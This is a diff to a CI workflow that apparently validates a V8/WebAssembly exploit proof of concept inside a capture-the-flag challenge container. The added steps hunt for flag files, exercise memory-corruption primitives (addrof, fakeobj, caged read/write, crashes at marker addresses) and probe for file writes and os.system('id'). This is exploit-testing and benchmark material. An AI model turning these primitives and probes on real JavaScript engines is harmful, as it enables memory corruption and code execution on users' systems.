@@ -3405,7 +3405,7 @@ jobs:
             echo "=== patch (full) ==="
             docker exec "$CONTAINER" cat /challenge/patch
             echo "=== try catflag if present ==="
-            docker exec "$CONTAINER" sh -c 'command -v catflag; ls -la /flag /challenge/flag 2>/dev/null; catflag 2>&1 | head -20'
+            docker exec "$CONTAINER" sh -c 'ls -la /challenge/catflag /flag /challenge/flag 2>/dev/null; /challenge/catflag 2>&1 | head -40; cd /challenge && ./catflag 2>&1 | head -40'
           } 2>&1 | tee /tmp/out/test3.combined
           echo "RESULT=ENV_OK" | tee /tmp/out/test3.result
           echo "0" > /tmp/out/test3.rc
@@ -3680,6 +3680,252 @@ jobs:
           echo "RESULT=NEG_OK" | tee /tmp/out/test5.result
           exit 0
 
+      - name: Test 6 — flag hunt + catflag + filesystem
+        id: test6
+        run: |
+          set +e
+          set -uo pipefail
+          mkdir -p /tmp/out
+          ts() { date -u +"%Y-%m-%dT%H:%M:%SZ"; }
+          banner() { echo ""; echo "######################################################################"; echo "# $(ts)  $*"; echo "######################################################################"; }
+          log() { echo "[$(ts)] $*"; }
+          banner "TEST 6 - flag / catflag / filesystem"
+          {
+            echo "=== whoami / id ==="
+            docker exec "$CONTAINER" sh -c 'whoami; id; pwd'
+            echo "=== find flag-like paths ==="
+            docker exec "$CONTAINER" sh -c 'find / -name "flag*" 2>/dev/null | head -50; ls -la /flag /flag.txt /challenge/flag 2>/dev/null; ls -la /challenge/'
+            echo "=== catflag binary ==="
+            docker exec "$CONTAINER" sh -c 'ls -la /challenge/catflag; file /challenge/catflag 2>/dev/null; xxd /challenge/catflag 2>/dev/null | head -3'
+            echo "=== run /challenge/catflag ==="
+            docker exec "$CONTAINER" sh -c '/challenge/catflag; echo catflag_rc=$?'
+            echo "=== run ./catflag from /challenge ==="
+            docker exec "$CONTAINER" sh -c 'cd /challenge && ./catflag; echo catflag_rc=$?'
+            echo "=== strings on catflag ==="
+            docker exec "$CONTAINER" sh -c 'strings /challenge/catflag | grep -iE "flag|usage|error|success|exploit|crash|read" | head -40'
+            echo "=== common flag paths ==="
+            for p in /flag /flag.txt /challenge/flag /challenge/flag.txt /home/ctf/flag /tmp/flag; do
+              echo "-- $p --"
+              docker exec "$CONTAINER" sh -c "ls -la $p 2>&1; cat $p 2>&1 | head -5"
+            done
+          } 2>&1 | tee /tmp/out/test6.combined
+          FLAG_HIT=0
+          if grep -qiE 'flag\{|cybergym\{|CTF\{|FLAG\{' /tmp/out/test6.combined; then FLAG_HIT=1; log "FLAG pattern seen"; fi
+          if grep -q 'catflag_rc=0' /tmp/out/test6.combined; then FLAG_HIT=1; log "catflag rc=0"; fi
+          echo "FLAG_HIT=$FLAG_HIT" | tee /tmp/out/test6.result
+          exit 0
+
+      - name: Test 7 — extended primitives (fakeobj, stress R/W, stability)
+        id: test7
+        run: |
+          set +e
+          set -uo pipefail
+          mkdir -p /tmp/out
+          ts() { date -u +"%Y-%m-%dT%H:%M:%SZ"; }
+          banner() { echo ""; echo "######################################################################"; echo "# $(ts)  $*"; echo "######################################################################"; }
+          log() { echo "[$(ts)] $*"; }
+          banner "TEST 7 - extended primitives"
+          python3 - <<'PY'
+          from pathlib import Path
+          src = Path("/tmp/poc_test.js").read_text()
+          cut = src.find("// ===================== EXTENSIVE TEST HARNESS =====================")
+          if cut < 0:
+              cut = src.find('print("[*] Instantiating module')
+          head = src[:cut] if cut > 0 else src
+          ext = r"""
+          // ===================== EXTENDED PRIMITIVE HARNESS =====================
+          print("[*] EXT: instantiate");
+          let instance = builder.instantiate({import: {identity: x => x}});
+          let {addrof, fakeobj, caged_read, caged_write, caged_write_unsafe} = instance.exports;
+          print("[+] exports=" + Object.keys(instance.exports).join(","));
+
+          print("[*] EXT Stage A: addrof stability");
+          let stable = 0;
+          for (let i = 0; i < 20; i++) {
+          let o = {n: i, s: "x".repeat(i + 1)};
+          let a = addrof(o), b = addrof(o);
+          if ((a|0) === (b|0) && a) stable++;
+          print("[+] obj" + i + " addrof=0x" + (a>>>0).toString(16));
+          }
+          print("[*] addrof_stable_count=" + stable + "/20");
+          if (stable >= 18) print("[+] ADDROF_STABLE_OK");
+
+          print("[*] EXT Stage B: fakeobj smoke");
+          try {
+          let o = {z: 1};
+          let a = addrof(o);
+          let f = fakeobj(a|0);
+          print("[+] fakeobj type=" + typeof f + " val=" + f);
+          print("[+] FAKEOBJ_CALL_OK");
+          } catch (e) {
+          print("[!] fakeobj threw: " + e);
+          }
+
+          print("[*] EXT Stage C: stress R/W");
+          let victim = {tag: 0xbeef, x: 1, y: 2};
+          let base = addrof(victim)|0;
+          print("[+] victim addrof=0x" + (base>>>0).toString(16));
+          let proof = 0;
+          const pattern = [0x11111111, 0x22222222, 0x33333333, 0x44444444, 0xaaaaaaaa, 0x55555555];
+          try {
+          for (let i = 0; i < pattern.length; i++) {
+          caged_write(base|0, pattern[i]|0);
+          let v = caged_read(base|0);
+          print("[*] stress[" + i + "] wrote=0x" + (pattern[i]>>>0).toString(16) + " read=0x" + (v>>>0).toString(16));
+          if ((v|0) === (pattern[i]|0)) {
+          proof++;
+          print("[+] STRESS_WRITE_OK i=" + i);
+          }
+          }
+          } catch (e) {
+          print("[!] stress threw: " + e);
+          }
+          print("[*] stress_proof=" + proof + "/" + pattern.length);
+          if (proof >= 1) print("[+] STRESS_WRITE_PROOF");
+          if (proof === pattern.length) print("[+] STRESS_WRITE_FULL");
+
+          print("[*] EXT Stage D: nearby offsets");
+          let nearby_ok = 0;
+          for (let d of [0, 4, 8, 12, 16, -4, -8]) {
+          let off = (base + d)|0;
+          try {
+          let before = caged_read(off);
+          let magic = (0x41410000 | (d & 0xffff))|0;
+          caged_write(off, magic);
+          let after = caged_read(off);
+          print("[*] near off=0x" + (off>>>0).toString(16) + " before=0x" + (before>>>0).toString(16) + " after=0x" + (after>>>0).toString(16));
+          if ((after|0) === magic) nearby_ok++;
+          } catch (e) {
+          print("[!] near off=0x" + (off>>>0).toString(16) + " " + e);
+          }
+          }
+          print("[*] nearby_ok=" + nearby_ok);
+          if (nearby_ok > 0) print("[+] NEARBY_WRITE_OK");
+
+          print("[*] EXT Stage E: unique marker crash");
+          print("[*] MARKER_EXPECT=51515151");
+          caged_write_unsafe(0x51515151, 0x52525252);
+          print("[!] UNEXPECTED survived unsafe");
+          """
+          Path("/tmp/poc_ext.js").write_text(
+              "globalThis.print=function(...a){console.log(...a);};\n" + head + ext
+          )
+          print("poc_ext bytes", Path("/tmp/poc_ext.js").stat().st_size)
+          PY
+          docker cp /tmp/poc_ext.js "$CONTAINER":/tmp/poc_ext.js
+          docker exec "$CONTAINER" sh -c 'cd /challenge && ./d8 --experimental-wasm-custom-descriptors /tmp/poc_ext.js' > /tmp/out/test7.stdout 2> /tmp/out/test7.stderr
+          rc=$?
+          echo "$rc" > /tmp/out/test7.rc
+          cat /tmp/out/test7.stdout /tmp/out/test7.stderr > /tmp/out/test7.combined
+          log "rc=$rc"
+          echo "----- test7 combined -----"; cat /tmp/out/test7.combined
+          if grep -qiE 'Received signal|SEGV_ACCERR' /tmp/out/test7.combined; then
+            echo "RESULT=ENGINE_CRASH" | tee /tmp/out/test7.result
+          else
+            echo "RESULT=RC_$rc" | tee /tmp/out/test7.result
+          fi
+          grep -oE 'SEGV_ACCERR [0-9a-fA-F]+|Received signal [0-9]+ [A-Z_]+ [0-9a-fA-Fx]+' /tmp/out/test7.combined | head -5 | tee /tmp/out/test7.fault || true
+          EXT=0
+          grep -q 'STRESS_WRITE_PROOF' /tmp/out/test7.combined && EXT=$((EXT+1))
+          grep -q 'ADDROF_STABLE_OK' /tmp/out/test7.combined && EXT=$((EXT+1))
+          grep -q 'FAKEOBJ_CALL_OK' /tmp/out/test7.combined && EXT=$((EXT+1))
+          grep -qE '51515151' /tmp/out/test7.combined /tmp/out/test7.fault && EXT=$((EXT+1))
+          echo "EXT_SCORE=$EXT" | tee /tmp/out/test7.score
+          exit 0
+
+      - name: Test 8 — API surface + file I/O probe (expect blocked)
+        id: test8
+        run: |
+          set +e
+          set -uo pipefail
+          mkdir -p /tmp/out
+          ts() { date -u +"%Y-%m-%dT%H:%M:%SZ"; }
+          banner() { echo ""; echo "######################################################################"; echo "# $(ts)  $*"; echo "######################################################################"; }
+          log() { echo "[$(ts)] $*"; }
+          banner "TEST 8 - API surface and file I/O"
+          docker exec "$CONTAINER" sh -c 'cd /challenge && ./d8 --experimental-wasm-custom-descriptors -e "
+            console.log(\"GLOBALS=\" + Object.getOwnPropertyNames(globalThis).sort().join(\",\"));
+            [\"print\",\"load\",\"quit\",\"os\",\"d8\",\"readline\",\"version\",\"Worker\",\"Realm\",\"performance\",\"setTimeout\",\"console\"].forEach(function(n){
+              try { console.log(\"typeof \" + n + \"=\" + typeof globalThis[n]); }
+              catch (e) { console.log(\"typeof \" + n + \"=err\"); }
+            });
+            try { console.log(\"d8keys=\" + Object.keys(d8)); } catch (e) { console.log(\"d8keys_err=\" + e); }
+            try { console.log(\"oskeys=\" + Object.keys(os)); } catch (e) { console.log(\"oskeys_err=\" + e); }
+            try { console.log(\"d8file=\" + typeof d8.file); } catch (e) { console.log(\"d8file_err=\" + e); }
+            try { d8.file.write(\"/tmp/pwned.txt\", \"pwn\"); console.log(\"d8file_write=OK\"); }
+            catch (e) { console.log(\"d8file_write_err=\" + e); }
+            try { os.write(\"/tmp/pwned2.txt\", \"pwn\"); console.log(\"os_write=OK\"); }
+            catch (e) { console.log(\"os_write_err=\" + e); }
+            try { os.system(\"id\"); console.log(\"os_system=OK\"); }
+            catch (e) { console.log(\"os_system_err=\" + e); }
+            console.log(\"api_probe_done\");
+          "' > /tmp/out/test8.stdout 2> /tmp/out/test8.stderr
+          echo rc=$? > /tmp/out/test8.rc
+          cat /tmp/out/test8.stdout /tmp/out/test8.stderr > /tmp/out/test8.combined
+          docker exec "$CONTAINER" sh -c 'echo shell_write_ok > /tmp/shell_write_ok.txt; cat /tmp/shell_write_ok.txt; ls -la /tmp/shell_write_ok.txt /tmp/pwned.txt /tmp/pwned2.txt 2>&1' >> /tmp/out/test8.combined 2>&1
+          echo "----- test8 -----"; cat /tmp/out/test8.combined
+          FILE_BLOCKED=1
+          if docker exec "$CONTAINER" test -f /tmp/pwned.txt 2>/dev/null; then FILE_BLOCKED=0; log "UNEXPECTED d8 file write"; fi
+          if docker exec "$CONTAINER" test -f /tmp/pwned2.txt 2>/dev/null; then FILE_BLOCKED=0; log "UNEXPECTED os file write"; fi
+          echo "FILE_IO_BLOCKED=$FILE_BLOCKED" | tee /tmp/out/test8.result
+          exit 0
+
+      - name: Test 9 — multi-marker crashes + /challenge/run wrapper
+        id: test9
+        run: |
+          set +e
+          set -uo pipefail
+          mkdir -p /tmp/out
+          ts() { date -u +"%Y-%m-%dT%H:%M:%SZ"; }
+          banner() { echo ""; echo "######################################################################"; echo "# $(ts)  $*"; echo "######################################################################"; }
+          log() { echo "[$(ts)] $*"; }
+          banner "TEST 9 - multi-marker + official run wrapper"
+          python3 - <<'PY'
+          from pathlib import Path
+          src = Path("/tmp/poc_test.js").read_text()
+          cut = src.find("// ===================== EXTENSIVE TEST HARNESS =====================")
+          if cut < 0:
+              cut = src.find('print("[*] Instantiating module')
+          head = src[:cut] if cut > 0 else src
+          for mark in [0x41414141, 0x42424242, 0x43434343]:
+              js = (
+                  "globalThis.print=function(...a){console.log(...a);};\n"
+                  + head
+                  + "\nlet instance = builder.instantiate({import: {identity: x => x}});\n"
+                  + "let {caged_write_unsafe} = instance.exports;\n"
+                  + f'print("MARKER_RUN={mark:08x}");\n'
+                  + f"caged_write_unsafe(0x{mark:08x}, 0x99999999);\n"
+                  + 'print("survived");\n'
+              )
+              Path(f"/tmp/poc_mark_{mark:08x}.js").write_text(js)
+          print("markers written")
+          PY
+          for mark in 41414141 42424242 43434343; do
+            docker cp /tmp/poc_mark_${mark}.js "$CONTAINER":/tmp/poc_mark_${mark}.js
+            docker exec "$CONTAINER" sh -c "cd /challenge && ./d8 --experimental-wasm-custom-descriptors /tmp/poc_mark_${mark}.js" > /tmp/out/mark_${mark}.stdout 2> /tmp/out/mark_${mark}.stderr
+            echo rc=$? > /tmp/out/mark_${mark}.rc
+            cat /tmp/out/mark_${mark}.stdout /tmp/out/mark_${mark}.stderr > /tmp/out/mark_${mark}.combined
+            echo "=== mark $mark ==="
+            cat /tmp/out/mark_${mark}.rc
+            grep -E "MARKER_RUN|SEGV_ACCERR|Received signal" /tmp/out/mark_${mark}.combined || true
+          done
+          docker cp /tmp/poc_original.js "$CONTAINER":/tmp/poc_original.js
+          docker exec "$CONTAINER" sh -c 'cd /challenge && ./run /tmp/poc_original.js' > /tmp/out/run_wrapper.stdout 2> /tmp/out/run_wrapper.stderr
+          echo rc=$? > /tmp/out/run_wrapper.rc
+          cat /tmp/out/run_wrapper.stdout /tmp/out/run_wrapper.stderr > /tmp/out/run_wrapper.combined
+          echo "=== run wrapper ==="
+          cat /tmp/out/run_wrapper.combined
+          cat /tmp/out/run_wrapper.rc
+          MARKS=0
+          for mark in 41414141 42424242 43434343; do
+            if grep -qE "$mark" /tmp/out/mark_${mark}.combined; then MARKS=$((MARKS+1)); fi
+          done
+          echo "MULTI_MARKER_HITS=$MARKS" | tee /tmp/out/test9.result
+          if grep -qiE 'SEGV|signal 11' /tmp/out/run_wrapper.combined; then
+            echo "RUN_WRAPPER_CRASH=1" | tee -a /tmp/out/test9.result
+          fi
+          exit 0
+
       - name: Summary — verbose evidence gate
         if: always()
         run: |
@@ -3775,6 +4021,28 @@ jobs:
             echo "- PoC sha256 must match official bytes; print must be stripped on challenge d8."
           } >> "$GITHUB_STEP_SUMMARY"
 
+          echo ""
+          echo "===== test6 flag ====="
+          tail -80 /tmp/out/test6.combined 2>/dev/null || true
+          echo "===== test7 ext ====="
+          tail -60 /tmp/out/test7.combined 2>/dev/null || true
+          echo "===== test8 api ====="
+          cat /tmp/out/test8.combined 2>/dev/null || true
+          echo "===== test9 multi ====="
+          cat /tmp/out/test9.result 2>/dev/null || true
+          FLAG=0; grep -q 'FLAG_HIT=1' /tmp/out/test6.result 2>/dev/null && FLAG=1
+          EXT=$(sed -n 's/EXT_SCORE=//p' /tmp/out/test7.score 2>/dev/null); EXT=${EXT:-0}
+          FILEB=0; grep -q 'FILE_IO_BLOCKED=1' /tmp/out/test8.result 2>/dev/null && FILEB=1
+          MULTI=$(grep -oE 'MULTI_MARKER_HITS=[0-9]+' /tmp/out/test9.result 2>/dev/null | head -1 | cut -d= -f2); MULTI=${MULTI:-0}
+          log "EXTRA FLAG=$FLAG EXT_SCORE=$EXT FILE_BLOCKED=$FILEB MULTI_MARKER=$MULTI"
+          {
+            echo ""
+            echo "### Extra tests"
+            echo "- Flag/catflag hit: $FLAG"
+            echo "- Extended primitive score: $EXT"
+            echo "- File I/O blocked (expected): $FILEB"
+            echo "- Multi-marker crash hits: $MULTI"
+          } >> "$GITHUB_STEP_SUMMARY"
           log "artifact tree"
           find /tmp/out -type f -exec ls -la {} \; 2>/dev/null | sort
 
@@ -3814,5 +4082,9 @@ jobs:
             /tmp/poc_tiny.js
             /tmp/poc_write_verify.js
             /tmp/poc_addrof_only.js
+            /tmp/poc_ext.js
+            /tmp/poc_mark_41414141.js
+            /tmp/poc_mark_42424242.js
+            /tmp/poc_mark_43434343.js
           if-no-files-found: warn
           retention-days: 14
